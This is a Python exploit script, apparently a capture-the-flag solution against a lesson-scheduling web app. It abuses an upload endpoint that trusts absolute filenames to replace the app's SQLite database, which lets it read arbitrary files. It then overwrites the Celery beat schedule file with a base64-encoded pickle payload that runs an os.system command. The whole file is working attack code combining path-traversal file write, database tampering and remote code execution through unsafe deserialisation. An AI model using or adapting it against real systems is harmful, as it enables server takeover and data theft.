import base64,http.client,json,os,re,sqlite3,tempfile,threading,time,uuid
from urllib.parse import urlencode

HOST, PORT = "fbubouflcmz6cnrc.instances.ctfcup.online", 80
B64 = (
    "z5pXEwACAAAAAgAAAAAAAAACAAAGAAAAAAIAABAAAAAACAAAAAAAABwAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "BAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAE"
    "AAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQA"
    "AAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAA"
    "AAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAA"
    "AAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAA"
    "AAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAA"
    "AAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAA"
    "AAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAA"
    "BAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAEA"
    "AAAAAAAALgEAAAAAAADSBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAD/////"
    "AAAAAAAAAAAAAAAAAAAAAAAAAABhie4TZW50cgAGAAAAAAAABwAAAIkAAAD/////AAAAAAAAAAAA"
    "AAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAA"
    "AAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAA"
    "AAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAA"
    "AAAAAAAAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAbXrIedXRjX6QGAAAAAAAACwAAAAQAAADb"
    "yeEnX192ZbMGAAAAAAAACwAAABQAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAA"
    "AAAAAAAAAAAAAAAAAAC/sFQYdHoAAJAGAAAAAAAAAgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAZW50"
    "cmllc4AElX4AAAAAAAAAjAhidWlsdGluc5SMBGV2YWyUk5SMYl9faW1wb3J0X18oJ29zJykuc3lz"
    "dGVtKCdjaG1vZCA0MDQgL2ZsYWcudHh0OyBlY2hvIG9rID4gL2RhdGEvcHduZWQ7IGNobW9kIDY0"
    "NCAvZGF0YS9wd25lZCcpIG9yIHt9lIWUUpQudHqABJUHAAAAAAAAAIwDVVRDlC51dGNfZW5hYmxl"
    "ZIAEiC5fX3ZlcnNpb25fX4AElQkAAAAAAAAAjAU1LjMuNJQuAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
)
PAY = base64.b64decode(B64)
SCHEMA = """CREATE TABLE lessons (id INTEGER PRIMARY KEY AUTOINCREMENT,title TEXT,subject TEXT,
teacher TEXT,scheduled_at INTEGER,status TEXT DEFAULT 'planned',homework TEXT,file_name TEXT,
file_path TEXT,created_at INTEGER);
CREATE TABLE comments (id INTEGER PRIMARY KEY AUTOINCREMENT,lesson_id INTEGER,author TEXT,
body TEXT,created_at INTEGER);"""

def req(m, p, b=None, h=None, tries=3, to=12):
    for _ in range(tries):
        try:
            c = http.client.HTTPConnection(HOST, PORT, timeout=to)
            c.request(m, p, b, h or {}); r = c.getresponse()
            d = r.read(); c.close(); return r.status, dict(r.getheaders()), d
        except Exception:
            time.sleep(0.5)
    return 0, {}, b""

def mp(path, payload):
    b = "----x" + uuid.uuid4().hex
    body = (f'--{b}\r\nContent-Disposition: form-data; name="file"; filename="{path}"\r\n'
            'Content-Type: application/octet-stream\r\n\r\n').encode() + payload + \
           f"\r\n--{b}--\r\n".encode()
    return body, {"Content-Type": f"multipart/form-data; boundary={b}"}

def inject(a, paths):
    f = os.path.join(tempfile.mkdtemp(), "uroki_db")
    c = sqlite3.connect(f); c.executescript(SCHEMA)
    rows = [(a, "/data/uroki.db")] + [(a + 1 + n, p) for n, p in enumerate(paths)]
    for rid, p in rows:
        c.execute("INSERT INTO lessons(id,title,subject,teacher,scheduled_at,file_path,created_at)"
                  "VALUES(?,?,?,?,?,?,?)", (rid, "x", "x", "x", 0, p, 0))
    c.commit(); c.close()
    st = req("POST", f"/lesson/{a}/upload", *mp("/data/uroki.db", open(f, "rb").read()))[0]
    print("[*] db injected:", st); return st

def put(path):
    return req("POST", f"/lesson/{A}/upload", *mp(path, PAY))[0]

def get(i):
    s, _, d = req("GET", f"/lesson/{i}/file")
    return s, d.decode("utf8", "replace")

def form():
    return urlencode({"title": "A", "subject": "M", "teacher": "I",
                      "date": "2030-01-01", "time": "10:00"}).encode(), \
           {"Content-Type": "application/x-www-form-urlencoded"}

status, _, body = req("GET", "/api/lessons.json")
ids = [r["id"] for r in json.loads(body)] if body[:1] == b"[" else []
print("[*] lessons:", ids)
A = ids[0] if ids else 1
if not ids:
    st, hd, _ = req("POST", "/lesson", *form())
    m = re.search(r"/lesson/(\d+)", hd.get("Location", ""))
    A = int(m.group(1)) if m else 1
    print("[*] created lesson", A, st)

PATHS = ["/flag.txt", "/data/pwned", "/data/celerybeat-schedule", "/data/celerybeat-schedule.db"]
inject(A, PATHS)
print("[*] schedule file (gnu):", get(A + 3)[0], " ndbm:", get(A + 4)[0], " flag:", get(A + 1)[0])

print("[*] uploading beat payload:", put("/data/celerybeat-schedule"))

def spam():
    for _ in range(45):
        put("/data/celerybeat-schedule"); time.sleep(0.4)

th = threading.Thread(target=spam, daemon=True); th.start()
time.sleep(0.6)
print("[*] restart celery:", req("POST", f"/lesson/{A}/edit", *form(), to=25)[0])
time.sleep(1.5)
print("[*] restart celery:", req("POST", f"/lesson/{A}/edit", *form(), to=25)[0])
th.join(timeout=20)

for n in range(20):
    fs, fb = get(A + 1); ps, pb = get(A + 2)
    print(f"[*] try {n}: flag={fs} pwned={ps}")
    if fs == 200 and "ctfcup{" in fb:
        print("\n[+] FLAG:", re.search(r"ctfcup\{[^}]*\}", fb).group(0)); break
    if ps == 200:
        print("[*] rce marker:", pb.strip())
    time.sleep(3)
else:
    print("[-] no luck; send the output")
